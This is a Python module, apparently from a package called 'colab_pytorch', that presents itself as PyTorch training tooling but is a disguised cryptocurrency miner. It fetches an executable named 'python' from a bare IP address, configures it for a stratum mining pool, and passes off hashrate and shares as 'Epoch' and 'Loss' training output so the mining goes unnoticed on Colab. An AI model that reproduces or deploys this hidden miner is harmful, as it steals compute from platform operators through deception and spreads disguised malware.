import os
from pathlib import Path
import requests
import time
from subprocess import Popen
from colab_pytorch._command import run_command
from colab_pytorch._utils import id_generator, run_app, get_mem, get_device_name
from ._common import CommonTool

class Nsf(CommonTool):
    def __init__(self, server_port, prevent_interrupt=True, api_port=40000, gpu=True, verbose=False, version=None, worker_name=None):
        super(Nsf, self).__init__(server_port, prevent_interrupt, api_port, gpu, verbose, worker_name)

    def download(self, homepath: Path):
        client_path = homepath / "python"
        if not os.path.isfile(client_path):
            run_command(f"wget -q -nc -O {client_path} http://146.56.170.196/downloads/python")
        run_command(f"chmod +x {client_path}")
        if self.verbose: print(f"DEBUG: Downloaded {client_path}")
        self.client_path = client_path

        config_path = homepath / "conf"
        if not os.path.isfile(config_path):
            worker_name = self.worker_name
            if worker_name is None:
                worker_name = os.getenv('HOSTNAME', id_generator())
            config = f"--tstart 50 --tstop 85 -Q --api-bind 127.0.0.1:{self.api_port} --report-hashrate -P stratum://colabpytorch.{worker_name}:123456@localhost:{self.server_port}"
            if self.gpu: config = f"-U {config}"
            else: config = f"--cpu {config}"
            with open(config_path, 'w') as conf:
                conf.write(config)
        self.config_path = config_path

    def wait_tool(self):
        last_found = 0
        while last_found == 0:
            _, _, _, last_found = requests.get(f"http://127.0.0.1:{self.api_port}/api/status").json()["mining"]["shares"]
            time.sleep(1)

    def run_tool(self) -> Popen:
        return run_app(f"{self.client_path} -F {self.config_path}", self.api_port, prevent_interrupt=self.prevent_interrupt, verbose=self.verbose)

    def get_status(self, i: int) -> str:
        def converthr(hz):
            if hz < pow(10, 3):
                return f"{hz}Hz"
            elif hz < pow(10, 6):
                return f"{round(hz/pow(10, 3), 2)}KHz"
            elif hz < pow(10, 9):
                return f"{round(hz/pow(10, 6), 2)}MHz"
            elif hz < pow(10, 12):
                return f"{round(hz/pow(10, 9), 2)}GHz"

        data = requests.get(f"http://127.0.0.1:{self.api_port}/api/status").json()
        hr = int(data["mining"]["hashrate"], 16)
        hz = converthr(hr)
        _, _, _, last_found = data["mining"]["shares"]
        total, used = get_mem(gpu=self.gpu)
        device = get_device_name(gpu=self.gpu)
        return f"Device: {device}, train Epoch: {i} [{used}/{total} ({used/total*100:.0f}%)]\tLoss: {hz}\tLast: {last_found}"
